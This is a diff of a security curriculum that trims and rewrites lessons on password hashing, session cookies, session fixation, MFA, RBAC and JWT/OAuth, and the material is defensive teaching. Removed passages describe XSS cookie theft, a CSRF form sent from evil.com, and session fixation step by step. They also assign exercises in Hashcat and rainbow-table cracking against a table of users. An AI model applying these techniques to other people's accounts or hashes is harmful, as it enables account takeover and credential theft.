-**PRACTICE UNTIL IT FEELS FAMILIAR**
+**PRACTICE:**
 
+| Difficulty | Task |
+| ---------- | ---- |
+| Easy | Hash the same password twice with a real library; explain why outputs differ |
+| Medium | Implement register/login with Argon2id or bcrypt; same message + similar timing for bad user vs bad password |
+| Hard | Design transparent rehash-on-login when raising cost factor; list what an attacker still can do during migration from unsalted MD5 |
 
-| Difficulty | Task                                                                                                                                                                                                                   |
-| ---------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| Easy       | Hash the same password with bcrypt three times and explain why the three outputs differ                                                                                                                                |
-| Easy       | Paste the MD5 of `password123` into CrackStation and report the result. Explain in one sentence what the salt would have prevented                                                                                     |
-| Easy       | Run the timing comparison in the code above and report your own numbers for SHA-256 versus Argon2id                                                                                                                    |
-| Easy       | Explain the difference between a salt and a pepper, and where each is stored                                                                                                                                           |
-| Easy       | Read the parameters out of an Argon2 hash string and say what each field means                                                                                                                                         |
-| Medium     | Implement registration and login with Argon2id, then verify that a wrong password and an unknown username take the same time and return the same message                                                               |
-| Medium     | Implement the transparent rehash-on-login upgrade, then prove it works by lowering your cost factor, creating a user, raising it, and logging in                                                                       |
-| Medium     | Deliberately implement comparison with `==` and then with `compare_digest`, and explain what an attacker could measure in the first case                                                                               |
-| Medium     | Wire the Have I Been Pwned check into registration and explain why sending only five hex characters preserves the user's privacy                                                                                       |
-| Medium     | Generate 1000 hashes at bcrypt cost 10, 12, and 14, and plot verification time against cost. Choose a cost for a service handling 50 logins per second and justify it                                                  |
-| Medium     | Run Hashcat against your own SHA-256 hash of a common password, then against your own bcrypt hash of the same password, and compare the elapsed times                                                                  |
-| Hard       | Build a rainbow table for the 10,000 most common passwords under unsalted SHA-256, crack a table of 1000 users with it, then add salts and demonstrate the table is now worthless                                      |
-| Hard       | Implement Argon2id's memory-filling loop yourself from the RFC, verify your output against the reference implementation, then explain exactly why the memory requirement resists GPUs                                  |
-| Hard       | Design the complete migration for a legacy system storing unsalted MD5, where you cannot ask users to reset. Write down every step, what an attacker can still do during the transition, and how long the window lasts |
-| Hard       | Add per-account and per-IP rate limiting in front of your login endpoint, then load-test it to show that an attacker cannot exhaust your CPU while legitimate users still log in                                       |
-| Hard       | Read [NIST SP 800-63B](https://pages.nist.gov/800-63-3/sp800-63b.html) section 5.1.1 and rewrite your application's password policy to match it, listing every rule you had to delete                                  |
+**WHAT THIS UNLOCKS NEXT:**
 
-
-**WHY THE NEXT TOPIC IS NEEDED - Authentication & Authorization:** Crypto protects channels and stored secrets. It still does not answer *who* is calling or *what* they may do. Sessions, MFA, RBAC, JWT, and OAuth live in Phase 68.
+Crypto protects channels and stored secrets. It still does not answer *who* is calling the bookstore API or *what* they may do. Sessions, MFA, RBAC, JWT, and OAuth live in Phase 68.
 
 ---
 
@@ -13817,338 +12017,134 @@ def is_breached(password: str) -> bool:
 
 ---
 
-
-
 # PHASE 68 - Authentication & Authorization
 
 **Track:** Data & Security
 
-**WHAT YOU WILL BE ABLE TO DO:** Explain sessions vs JWT; teach MFA and RBAC at working depth; design a permission check (authentication vs authorization); and choose cookie attributes that close common session theft paths.
+**WHAT YOU WILL BE ABLE TO DO:** Explain sessions vs JWT; apply MFA and RBAC at working depth; design a permission check (authentication vs authorization); choose cookie attributes that close common session-theft paths.
 
-**WHAT YOU SHOULD KNOW FIRST:** Phase 58 (HTTP is stateless - identity must be carried somehow), Phase 66 (trust boundaries), Phase 67 (TLS in transit; slow password hashes at rest).
+**WHAT YOU SHOULD KNOW FIRST:** Phase 58 — HTTP is stateless; Phase 66 — trust boundaries; Phase 67 — TLS in transit, slow password hashes at rest.
+
+**LEARNING RESOURCES:**
+
+- [Session Vs JWT (ByteByteGo)](https://www.youtube.com/watch?v=fyTxwIa-1U0)
+- [HTTP Cookies Crash Course (Web Dev Simplified)](https://www.youtube.com/watch?v=sovAIX4doOE)
+- [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
+- [RBAC vs ABAC (IBM Technology)](https://www.youtube.com/watch?v=rvZ35YW4t5k)
+- [OAuth 2 Explained (ByteByteGo)](https://www.youtube.com/watch?v=ZV5yTm4pT8g)
+- [MDN — Using HTTP cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies)
 
 ## 68.1 Authentication, Sessions & Cookies
 
-**WHY YOU ARE LEARNING THIS:** TLS gave you a private channel, and privacy is not identity. The server now knows nobody else can read the conversation, and still has no idea who is on the other end of it. Worse, HTTP's statelessness from Phase 58, which was a deliberate design choice that made caching and horizontal scaling possible, means that even after a user proves who they are, the very next request arrives with the server having forgotten completely. The naive fix, sending the username and password on every single request, means the credentials cross the network hundreds of times per session and must be held somewhere on the client to do it. Sessions exist because identity needs to survive statelessness without re-transmitting the secret that established it.
+TLS gave the bookstore a private channel. Privacy is not identity. HTTP's statelessness means the next request arrives with no memory of login. Resending the password on every click is worse. Sessions carry identity forward without re-transmitting the secret that established it.
 
-**SEE IT BEFORE YOU MEMORIZE IT**
+**COOKIE AS TRANSPORT, SESSION AS MEMORY:**
 
-- Best animated explanation: [Session Vs JWT (ByteByteGo)](https://www.youtube.com/watch?v=fyTxwIa-1U0) *(Composio YouTube)*; [Session vs Token Authentication in 100 Seconds (Fireship)](https://www.youtube.com/watch?v=UBUNrFtufWo); [OAuth 2 Explained (ByteByteGo)](https://www.youtube.com/watch?v=ZV5yTm4pT8g) - the fastest correct framing of the two models, and it makes the storage-location trade-off visible immediately
-- Alternative: [Cookies and Sessions Explained (Hussein Nasser)](https://www.youtube.com/watch?v=GihQAC1I39Q) works through the actual headers on the wire, which is the level of detail interviews probe. For the deeper treatment, [Session Vs JWT: The Differences You May Not Know! (ByteByteGo)](https://www.youtube.com/watch?v=fyTxwIa-1U0) compares session and token auth side by side *(Composio YouTube; replaced dead auth ID)*
-- Another angle: [HTTP Cookies Crash Course (Web Dev Simplified)](https://www.youtube.com/watch?v=sovAIX4doOE) covers the cookie attributes specifically, which is where nearly all real security bugs in this area actually live
-- Interactive simulator: your browser's DevTools is the simulator. Open the Application panel, log into any site, and watch the cookie appear with its exact flags. Then delete it and reload to see the session collapse. Pair that with the Network panel to see the `Cookie` header being attached automatically to every request, which is the single behaviour that both makes sessions work and makes CSRF possible
-- Written documentation: [MDN - Using HTTP cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies) is the authoritative reference, [MDN - Set-Cookie](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie) for every attribute, and [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html) for the rules that experience produced
-- GitHub implementation: [express-session](https://github.com/expressjs/session) is small enough to read end to end and shows exactly how session ids are generated, signed, and looked up. [Flask's session implementation](https://github.com/pallets/flask/blob/main/src/flask/sessions.py) shows the signed-cookie variant, where the session data lives on the client but cannot be tampered with
-- Practice platform: [PortSwigger Web Security Academy's authentication labs](https://portswigger.net/web-security/authentication) - free, hands-on, and you break real authentication implementations rather than reading about them
+A cookie is a small string the browser stores and **automatically attaches** to matching requests. That automatic attachment is both the feature and the CSRF surface (Phase 69).
 
-**STEP-BY-STEP EXPLANATION**
+In the **server-side session** model, the cookie holds only an opaque, unguessable id. Real state (`user_id`, roles) lives in a server store. Generate ids with `secrets`, not `random`. At **login**, regenerate the id (session fixation). At **logout**, delete the server record — clearing the cookie alone leaves a stolen copy valid. Use idle and absolute timeouts.
 
-A cookie is nothing more than a small key-value string that a server asks a browser to store and that the browser then attaches automatically to every subsequent request to a matching domain and path. That automatic attachment is the entire mechanism, and it is worth separating from the *contents*, because the contents are a design decision with two very different answers.
+**Authentication** asks who you are. **Authorization** asks whether this identity may perform this action on this object — checked every request, not inferred from "logged in." An endpoint that trusts `invoice_id` from the URL because a session exists is a classic bug.
 
-In the **server-side session** model, the cookie holds only an opaque, unguessable identifier. All the real state, meaning which user this is and what they are allowed to do, lives in a store on the server keyed by that identifier. The identifier is meaningless to anyone who steals it in isolation, and it is also the only thing needed to impersonate the user, which is why it must be generated from a cryptographically secure random source and must be long enough that guessing is infeasible. Sequential or predictable session ids are a complete authentication bypass.
-
-In the **signed-cookie** model, the cookie holds the actual data along with a signature computed with a server-held secret. The server does not store anything. On each request it recomputes the signature and rejects the cookie if it does not match, which makes the data tamper-evident without being secret. This is a middle point between the two extremes and it inherits the revocation problem discussed in Phase 68.3.
-
-The cookie **attributes** are where the security actually lives, and each one closes a specific attack. `HttpOnly` makes the cookie invisible to JavaScript, which means an XSS vulnerability can no longer read the session id, converting a total account takeover into a lesser problem. `Secure` prevents the cookie from being sent over plain HTTP, which closes the window where an accidental HTTP request leaks the session to the network. `SameSite` controls whether the cookie is attached to cross-site requests, and setting it to `Lax` or `Strict` is what makes CSRF from Phase 69 largely structural rather than something you must defend against per endpoint. `Domain` and `Path` scope where the cookie is sent, and over-broad scoping on a shared domain leaks sessions between unrelated applications. `Max-Age` or `Expires` determines whether the cookie survives closing the browser.
-
-The **session lifecycle** has three moments that matter more than the happy path. At **login**, the session id must be regenerated rather than reused, because otherwise an attacker who plants a known session id in the victim's browser before login ends up sharing the authenticated session, an attack called session fixation. At **logout**, the server-side record must be deleted, not merely the cookie cleared, because a cookie the attacker already copied still works otherwise. And during **the session's life**, both an absolute timeout and an idle timeout should apply, so that a stolen session has a bounded useful lifetime.
-
-Finally, **authentication and authorization are different questions** and conflating them is a common source of real vulnerabilities. Authentication establishes who you are, and the session carries that answer forward. Authorization asks whether this particular identity may perform this particular action on this particular object, and it must be checked on every request against the actual resource, not inferred from the fact that a valid session exists. An endpoint that trusts an object id from the URL because the requester is logged in is the most common serious bug in production web applications.
-
-**System -> Weakness -> Attack -> Consequence -> Defense**
+**COOKIE ATTRIBUTES THAT MATTER:**
 
 ```text
-System:      HTTP is stateless (Phase 58) -- every request is handled
-             with zero memory of any previous request.
-Weakness:    Without extra state, a server can't tell "the same person
-             who just logged in" apart from a brand-new, anonymous request.
-Consequence: No way to keep a user logged in across multiple page loads
-             without asking them to re-enter credentials on every single request.
-Defense:     After a successful login, the server creates a SESSION (a
-             record, server-side, saying "this session ID belongs to user 5")
-             and gives the browser a SESSION ID inside a COOKIE. The browser
-             automatically resends that cookie on every subsequent request
-             to the same site, and the server looks up the session to know
-             who's asking.
-Trade-off:   Server-side sessions mean the server must store and look up
-             session state for every logged-in user (a real, growing cost
-             at scale, and a coordination problem the instant you have more
-             than one server -- revisited in Phase 81).
+Set-Cookie: sid=…; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=…
+
+  HttpOnly  — JS cannot read it (blunts XSS session theft)
+  Secure    — never sent on plain HTTP
+  SameSite  — not attached to most cross-site POSTs (CSRF)
+  Path/Domain — scope narrowly; avoid Domain=.example.com sprawl
 ```
-
-**Internal Working, Step by Step**
-
-```text
-1. User submits login form -> server verifies credentials (Phase 68)
-2. Server creates a session record: {session_id: "abc123", user_id: 5}
-3. Server responds: Set-Cookie: session_id=abc123
-4. Browser stores the cookie, automatically attaches it to every future
-   request to this domain: Cookie: session_id=abc123
-5. Server looks up "abc123" in its session store on each request,
-   finds user_id 5, and now knows who's asking -- statelessness "solved"
-   by pushing a small token back and forth instead of full credentials
-```
-
-**PICTURE IT LIKE THIS**
-
-You check into a hotel. At the front desk you show a passport, which is the credential, and it is inspected once and handed back. You are then given a room key card with no name on it, which is the session id. For the rest of your stay, every door you open reads only the card. The card is meaningless if found on the street by someone who does not know which hotel or room it belongs to, and it is complete access for anyone who does know. The hotel's own records, not the card, hold the fact that room 412 belongs to you, which is the server-side session store.
-
-Every cookie attribute has a hotel equivalent. `HttpOnly` is the card being physically impossible for the guest to photocopy. `Secure` is refusing to let the card work at an unlocked side entrance. `SameSite` is the card not working when someone else waves it at your door from the corridor. Logout deleting the server record is the front desk deactivating the card rather than just asking for it back, which is the difference that matters when a copy exists. Session id regeneration at login is being issued a fresh card at check-in rather than reusing whatever card you walked in holding.
-
-**Internal Working, the four cookie attributes and what each one stops**
-
-```text
-Set-Cookie: sid=8f3a...; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=3600
-
-  HttpOnly ---------------------------------------------------
-      Without:  XSS payload runs document.cookie -> exfiltrates
-                the session id -> full account takeover.
-      With:     JavaScript cannot see the cookie at all. The XSS
-                is still a bug, but no longer an account takeover.
-
-  Secure -----------------------------------------------------
-      Without:  one accidental http:// request (a stale link, a
-                redirect misconfiguration) sends the session id
-                in cleartext across the network.
-      With:     the browser withholds it entirely on http://.
-
-  SameSite=Lax -----------------------------------------------
-      Without:  evil.com submits a form to yourbank.com and the
-                browser helpfully attaches the victim's cookie.
-                That is CSRF (Phase 69).
-      With:     the cookie is not attached to cross-site POSTs,
-                so the forged request arrives unauthenticated.
-
-  Path / Domain ----------------------------------------------
-      Over-broad:  Domain=.example.com sends the session to every
-                   subdomain, including one run by another team
-                   or a compromised static host.
-      Scoped:      only where it is actually needed.
-```
-
-**Internal Working, session fixation and why login must regenerate the id**
-
-```text
-BROKEN (session id reused across the login boundary)
-
-  Attacker: obtains a valid pre-login session id  "S1"
-            and plants it in the victim's browser
-            (via a link, an XSS, or a subdomain cookie)
-  Victim:   arrives already holding S1, logs in successfully
-  Server:   marks S1 as "authenticated as user 5"
-  Attacker: still holds S1 --> is now logged in as user 5
-
-CORRECT (regenerate on privilege change)
-
-  Victim:   arrives holding S1, logs in successfully
-  Server:   creates S2, copies nothing sensitive, DESTROYS S1,
-            sends Set-Cookie: sid=S2
-  Attacker: still holds S1 --> which no longer exists
-
-  The same rule applies at every privilege escalation, not only
-  login: elevating to admin, completing step-up MFA, changing
-  a password. Each is a boundary that deserves a new id.
-```
-
-**WHAT YOU GAIN, WHAT IT COSTS, AND WHERE IT CAN FAIL**
-
-
-| Concern                   | Server-side session                  | Signed cookie                | Stateless token (Phase 68.3)       |
-| ------------------------- | ------------------------------------ | ---------------------------- | ---------------------------- |
-| Where state lives         | server store                         | client, tamper-evident       | client, tamper-evident       |
-| Lookup per request        | one store read                       | none, verify signature       | none, verify signature       |
-| Revocation                | immediate, delete the record         | not possible without a store | not possible without a store |
-| Size on the wire          | tiny id, ~32 bytes                   | grows with the data          | grows with the claims        |
-| Horizontal scaling        | needs shared store or sticky routing | trivially stateless          | trivially stateless          |
-| Failure mode of the store | logged-out users everywhere          | n/a                          | n/a                          |
-| Secret rotation           | id is opaque, rotation is free       | invalidates all cookies      | invalidates all tokens       |
-
-
-The session store lookup is the cost people notice first, and it is usually the least important one. A Redis read is well under a millisecond and the pattern is trivially cacheable. The genuine cost is operational: that store is now a stateful dependency on the request path, which means it needs replication, monitoring, and a considered answer for what happens when it is unavailable. This is exactly the trade-off Phase 81 revisits, and it is why the "sessions do not scale" claim is usually about operational surface area rather than latency.
-
-**SMALL WORKING EXAMPLE**
 
 ```python
-import secrets, hashlib, hmac, time
+import secrets, time
 
-# ---------------------------------------------------------------
-# A session layer that is small enough to read and correct enough
-# to reason about. Every line that exists for a security reason
-# is marked with why.
-# ---------------------------------------------------------------
+SESSIONS = {}
+IDLE, ABSOLUTE = 30 * 60, 12 * 3600
 
-SESSIONS = {}                 # in production: Redis, with a TTL
-IDLE_TIMEOUT     = 30 * 60    # 30 minutes without activity
-ABSOLUTE_TIMEOUT = 12 * 3600  # 12 hours regardless of activity
-
-def new_session_id() -> str:
-    # secrets, not random. random is seeded predictably and is a
-    # complete authentication bypass if used here.
-    # 32 bytes = 256 bits of entropy: unguessable by brute force.
-    return secrets.token_urlsafe(32)
-
-def login(user_id: int, old_session_id: str | None) -> str:
-    # Regenerate on the privilege boundary, and destroy the old
-    # record: this is the session fixation defence above.
-    if old_session_id:
-        SESSIONS.pop(old_session_id, None)
-
-    sid = new_session_id()
+def login(user_id: int, old_sid: str | None) -> str:
+    if old_sid:
+        SESSIONS.pop(old_sid, None)  # fixation defense
+    sid = secrets.token_urlsafe(32)
     now = time.time()
     SESSIONS[sid] = {"user_id": user_id, "created": now, "last_seen": now}
     return sid
 
 def resolve(sid: str | None) -> int | None:
-    """Return the authenticated user id, or None. Called on every request."""
-    if not sid:
+    if not sid or sid not in SESSIONS:
         return None
-    s = SESSIONS.get(sid)
-    if s is None:
-        return None
-
+    s = SESSIONS[sid]
     now = time.time()
-    if now - s["created"]   > ABSOLUTE_TIMEOUT: SESSIONS.pop(sid); return None
-    if now - s["last_seen"] > IDLE_TIMEOUT:     SESSIONS.pop(sid); return None
-
-    s["last_seen"] = now       # sliding idle window
+    if now - s["created"] > ABSOLUTE or now - s["last_seen"] > IDLE:
+        SESSIONS.pop(sid, None)
+        return None
+    s["last_seen"] = now
     return s["user_id"]
 
-def logout(sid: str) -> None:
-    # Delete the record, not just the cookie. A cookie the attacker
-    # already copied is still a valid cookie.
-    SESSIONS.pop(sid, None)
-
-def set_cookie_header(sid: str) -> str:
-    return (
-        f"Set-Cookie: sid={sid}; "
-        "HttpOnly; "            # XSS cannot read it
-        "Secure; "              # never sent over plain HTTP
-        "SameSite=Lax; "        # not attached to cross-site POSTs
-        "Path=/; "              # scoped as narrowly as the app allows
-        f"Max-Age={ABSOLUTE_TIMEOUT}"
-    )
-
-# ---------------------------------------------------------------
-# The signed-cookie variant: no server store, tamper-evident data.
-# ---------------------------------------------------------------
-SECRET = secrets.token_bytes(32)
-
-def sign(payload: str) -> str:
-    mac = hmac.new(SECRET, payload.encode(), hashlib.sha256).hexdigest()
-    return f"{payload}.{mac}"
-
-def verify(cookie: str) -> str | None:
-    try:
-        payload, mac = cookie.rsplit(".", 1)
-    except ValueError:
-        return None
-    expected = hmac.new(SECRET, payload.encode(), hashlib.sha256).hexdigest()
-    # compare_digest, not ==. A plain == leaks how many leading
-    # bytes matched through its timing, which is forgeable.
-    return payload if hmac.compare_digest(mac, expected) else None
-
-# ---------------------------------------------------------------
-# Authorization is a separate question from authentication.
-# ---------------------------------------------------------------
-def get_invoice(sid: str, invoice_id: int, db):
+def get_order(sid: str, order_id: int, db):
     user_id = resolve(sid)
     if user_id is None:
-        return 401, "not authenticated"          # who are you
-
-    invoice = db.fetch_invoice(invoice_id)
-    if invoice is None:
+        return 401, "not authenticated"
+    order = db.fetch_order(order_id)
+    if order is None:
         return 404, "not found"
-
-    if invoice.owner_id != user_id:
-        # Without this check, any logged-in user can read every
-        # invoice by changing the number in the URL. This is the
-        # single most common serious bug in production web apps.
-        return 403, "not authorized"             # may you do this
-
-    return 200, invoice
-
-# Demonstration
-sid = login(user_id=5, old_session_id=None)
-print(set_cookie_header(sid))
-print("resolves to:", resolve(sid))
-print("tampered signed cookie:", verify(sign("user=5").replace("user=5", "user=6")))
-logout(sid)
-print("after logout:", resolve(sid))
+    if order.owner_id != user_id:
+        return 403, "not authorized"  # AuthN ≠ AuthZ
+    return 200, order
 ```
 
-**HOW TO EXPLAIN THIS IN AN INTERVIEW**
+| Concern | Server session | Signed cookie / JWT (68.3) |
+| ------- | -------------- | -------------------------- |
+| Revocation | delete record | hard without a store |
+| Scaling | shared store or sticky | verify signature |
+| Lookup | every request | often none |
 
-"HTTP is stateless, so how does a site remember that I am logged in" is the opening question, and the expected answer names the cookie as the transport and the session store as the memory. From there the questions get specific. "Where should the session id come from" is testing whether you know that a predictable id is a full bypass. "Walk me through what `HttpOnly` and `SameSite` each prevent" is testing whether you understand cookies as a security surface rather than a storage mechanism. "What is the difference between authentication and authorization, and where have you seen the distinction go wrong" is extremely common and the strong answer is the object-ownership check in the code above. Expect also "what must happen at login besides checking the password," where regenerating the session id is the answer being fished for, and "how do you invalidate a session," which is the setup for the JWT comparison in Phase 68.3.
+**PRACTICE:**
 
-**PRACTICE UNTIL IT FEELS FAMILIAR**
+| Difficulty | Task |
+| ---------- | ---- |
+| Easy | Inspect a real session cookie in DevTools; explain HttpOnly / Secure / SameSite |
+| Medium | Sketch login that regenerates sid; show why reusing the pre-login id enables fixation |
+| Hard | Add ownership checks to a bookstore `GET /orders/{id}` and write the test that fails without them |
 
+**WHAT THIS UNLOCKS NEXT:**
 
-| Difficulty | Task                                                                                                                                                                                                              |
-| ---------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| Easy       | Log into any site, open DevTools' Application panel, and write down every attribute on its session cookie. Explain what each one is doing                                                                         |
-| Easy       | Delete that cookie, reload, and describe exactly what the server now knows about you and why                                                                                                                      |
-| Easy       | Run the code above, tamper with a signed cookie, and confirm it is rejected. Explain what the server had to store to detect this                                                                                  |
-| Easy       | Explain the difference between authentication and authorization using an example from an application you have used                                                                                                |
-| Medium     | Build a login flow with sessions in any framework, then verify with DevTools that your session cookie has `HttpOnly`, `Secure`, and `SameSite` set                                                                |
-| Medium     | Deliberately reuse the session id across login in your own app, then demonstrate the session fixation attack against yourself. Fix it and prove the fix                                                           |
-| Medium     | Implement both idle and absolute timeouts, then show that a session expires under each condition independently                                                                                                    |
-| Medium     | Add the missing ownership check to a deliberately broken endpoint, and write the test that would have caught its absence                                                                                          |
-| Medium     | Move your session store from process memory to Redis, then run two application instances behind a load balancer and confirm a login on one is visible to the other                                                |
-| Medium     | Complete three labs from [PortSwigger's authentication section](https://portswigger.net/web-security/authentication) and write down the root cause of each                                                        |
-| Hard       | Implement login rate limiting and account lockout, then explain how your design avoids becoming a denial-of-service vector against legitimate users                                                               |
-| Hard       | Add a "log out of all devices" feature to a session-based app, then explain why the equivalent is hard for stateless tokens (Phase 68.3)                                                                                |
-| Hard       | Design and implement remember-me functionality with a separate long-lived token, and write down its threat model versus reusing the session cookie with a long expiry                                             |
-| Hard       | Implement TOTP two-factor authentication from scratch against RFC 6238, then explain what session state must change the moment the second factor is verified                                                      |
-| Hard       | Read the [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html) and audit your own implementation against every item, listing what you failed |
-
-
-**WHY THE NEXT TOPIC IS NEEDED - MFA & RBAC:** A password (+ session) proves *something you know*. Real systems add *something you have* (MFA) and then decide *what that identity may do* (authorization / RBAC) - otherwise every logged-in user is effectively an admin.
+A password plus session proves *something Ada knows*. Credential stuffing and phishing still win against single-factor login. Real systems add *something she has* (MFA) and then decide *what that identity may do* (RBAC) — otherwise every logged-in user is effectively staff. That is Phase 68.2.
 
 ---
 
 ## 68.2 MFA & RBAC
 
-**WHY YOU ARE LEARNING THIS:** Phase 68.1 established "who is this session?" Password theft, phishing, and credential stuffing still defeat single-factor login. **MFA** adds another factor. Separately, knowing *who* someone is does not say whether they may delete a user or read payroll - that is **authorization**, commonly expressed as **RBAC** (roles → permissions).
+Password theft still defeats single-factor login. **MFA** adds an independent factor. Separately, knowing *who* someone is does not say whether they may delete a user or refund an order — that is **authorization**, commonly **RBAC**.
 
-**SEE IT BEFORE YOU MEMORIZE IT**
+**FACTOR CLASSES:**
 
-- MFA: [MFA Explained (Hired In IT)](https://www.youtube.com/watch?v=BxkkC6uvv7A) *(Composio YouTube)*; TOTP labs already in Hard practice above
-- RBAC vs ABAC: [RBAC vs ABAC (IBM Technology)](https://www.youtube.com/watch?v=rvZ35YW4t5k) *(Composio YouTube)*
-- Written: [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html); [NIST on MFA](https://www.nist.gov/itl/applied-cybersecurity/tig/back-basics-multi-factor-authentication)
+1. **Something you know** — password, PIN  
+2. **Something you have** — TOTP app, hardware key; SMS is weaker (SIM swap)  
+3. **Something you are** — biometrics (usually unlocks a device key)
 
-**STEP-BY-STEP EXPLANATION**
+Prefer TOTP / WebAuthn over SMS when you can. After MFA succeeds, **regenerate the session id** (same fixation rule). Use step-up MFA for dangerous actions (change payout bank, delete account).
 
-**Factors** (pick at least two independent classes for MFA):
-
-1. **Something you know** - password, PIN  
-2. **Something you have** - TOTP app, hardware key, SMS (weaker), email code  
-3. **Something you are** - biometrics (usually unlocks a device key, not a server secret)
-
-Prefer **TOTP / WebAuthn** over SMS when you can: SIM-swap attacks make SMS a weak second factor. After MFA succeeds, **regenerate the session id** (same fixation rule as password login).
-
-**RBAC** maps `user → role(s) → permissions`, then every sensitive action checks a permission - not "is logged in."
+**RBAC:**
 
 ```text
 user Ada  → roles {editor, billing_viewer}
-role editor → permissions {post:write, post:read}
-role billing_viewer → permissions {invoice:read}
+role editor → {post:write, post:read}
+role billing_viewer → {invoice:read}
 
-DELETE /users/9  requires permission user:delete
+DELETE /users/9  needs user:delete
   Ada logged in? yes
-  Ada has user:delete? no  → 403 Forbidden (authenticated but not authorized)
+  Ada has user:delete? no  → 403 (authenticated, not authorized)
 ```
 
-**Least privilege:** grant the smallest role that works; prefer deny-by-default. Object ownership checks ("may Ada edit *this* post?") still matter even with roles - RBAC is not a substitute for per-resource checks.
-
-**SMALL WORKING EXAMPLE**
+Least privilege; deny by default. Roles do not replace per-object checks ("may Ada edit *this* book listing?").
 
 ```python playground=cs-phase-68-rbac
-# Tiny RBAC: roles grant permissions; actions require a permission.
-
 ROLE_PERMS = {
-    "viewer": {"post:read"},
-    "editor": {"post:read", "post:write"},
-    "admin": {"post:read", "post:write", "user:delete"},
+    "viewer": {"book:read"},
+    "editor": {"book:read", "book:write"},
+    "admin": {"book:read", "book:write", "user:delete"},
 }
 
 def allowed(roles, permission):
@@ -14158,384 +12154,63 @@ def allowed(roles, permission):
     return permission in have
 
 ada = ["editor"]
-print("Ada write post?", allowed(ada, "post:write"))   # True
-print("Ada delete user?", allowed(ada, "user:delete")) # False
-
-# MFA is orthogonal: even admin still needs second factor at login / step-up.
-print("step-up MFA required for user:delete: yes")
+print("Ada write book?", allowed(ada, "book:write"))
+print("Ada delete user?", allowed(ada, "user:delete"))
+print("step-up MFA for user:delete: yes")
 ```
 
-**PRACTICE UNTIL IT FEELS FAMILIAR**
-
+**PRACTICE:**
 
 | Difficulty | Task |
 | ---------- | ---- |
 | Easy | Name three MFA factor classes; say why SMS is weaker than TOTP |
-| Medium | Design roles for a blog (reader, author, admin) and list permissions each needs |
-| Hard | Add a permission check middleware sketch that returns 401 vs 403 correctly |
+| Medium | Design roles for the bookstore (customer, clerk, admin) and list permissions |
+| Hard | Sketch middleware that returns 401 vs 403 correctly; note where object ownership still applies |
 
+**WHAT THIS UNLOCKS NEXT:**
 
-**WHY THE NEXT TOPIC IS NEEDED - JWT & OAuth:** Server-side sessions work well for one app and one session store. They get awkward across many services or when another company's app needs delegated access - JWT and OAuth address those shapes.
+Server-side sessions fit one app and one session store. Many services, or "print my Google Photos at a third-party shop," need self-verifying tokens and **delegated** access without sharing passwords. JWT and OAuth address those shapes — Phase 68.3.
+
+---
 
 ## 68.3 JWT & OAuth
 
-**WHY YOU ARE LEARNING THIS:** Server-side sessions from Phase 68.1 assumed one application, owned by one team, running against one session store. Two things break that assumption. First, scale and architecture: once a request can land on any of fifty service instances across three regions, every one of them needs to consult that store, and it becomes a shared stateful dependency on the hot path of every request in the system. Second, and more fundamentally, sessions have no answer at all for a *different company's* application needing to act on your user's behalf. The only mechanism available in the session model is for the user to hand over their password, which grants unlimited, unrevocable, unauditable access to everything. JWT addresses the first limitation by making the token self-verifying. OAuth addresses the second by making delegation a first-class operation instead of credential sharing.
+Once requests land on many bookstore services, every instance consulting one session store is awkward. Separately, sessions have no good answer for *another company's* app acting on Ada's behalf without her password. JWT makes assertions self-verifying; OAuth makes delegation first-class.
 
-**SEE IT BEFORE YOU MEMORIZE IT**
+**JWT — SIGNED CLAIMS, NOT ENCRYPTION:**
 
-- Best animated explanation: [What Is JWT and Why Should You Use JWT (Web Dev Simplified)](https://www.youtube.com/watch?v=7Q17ubqLfaM) - builds the token structure from first principles and shows the signature being verified, which is the part that makes "stateless" click
-- Alternative: [JWT Authentication Explained (ByteByteGo)](https://www.youtube.com/watch?v=P2CPd9ynFLg) is the sharpest short version, and [Session vs JWT (Hussein Nasser)](https://www.youtube.com/watch?v=fyTxwIa-1U0) argues the *against* case for JWTs, which is worth watching precisely because most content only argues for them
-- Another angle for OAuth: [OAuth 2.0 and OpenID Connect (Okta Developer, by Nate Barbettini)](https://www.youtube.com/watch?v=996OiexHze0) is widely considered the single best OAuth talk ever given and is worth the full hour. For the short version, [OAuth 2.0 Explained With Simple Terms (ByteByteGo)](https://www.youtube.com/watch?v=ZV5yTm4pT8g) and [An Illustrated Guide to OAuth and OpenID Connect (OktaDev)](https://www.youtube.com/watch?v=t18YB3xDfXI) *(Composio YouTube; replaced dead Okta short ID)*
-- Interactive simulator: [jwt.io](https://jwt.io/) is essential. Paste a token and watch the three parts decode, then change a single character in the payload and watch the signature turn red. Doing that once teaches that a JWT is signed, not encrypted, and that anyone holding it can read every claim inside. For OAuth, [oauthdebugger.com](https://oauthdebugger.com/) and [oauth.tools](https://oauth.tools/) let you run a real authorization code flow step by step and inspect every redirect and parameter
-- Written documentation: [RFC 7519](https://datatracker.ietf.org/doc/html/rfc7519) for JWT itself, [OAuth 2.0 Simplified](https://www.oauth.com/) by Aaron Parecki which is the most readable full treatment available free, [the OAuth 2.0 Security Best Current Practice](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics) for what a decade of deployment taught, and [Stop using JWT for sessions](http://cryto.net/~joepie91/blog/2016/06/13/stop-using-jwt-for-sessions/) for the essential counterargument
-- GitHub implementation: [jose](https://github.com/panva/jose) for a modern, correct implementation worth reading, [PyJWT](https://github.com/jpadilla/pyjwt) which is compact enough to follow completely, and [Keycloak](https://github.com/keycloak/keycloak) or [Ory Hydra](https://github.com/ory/hydra) for a full production authorization server
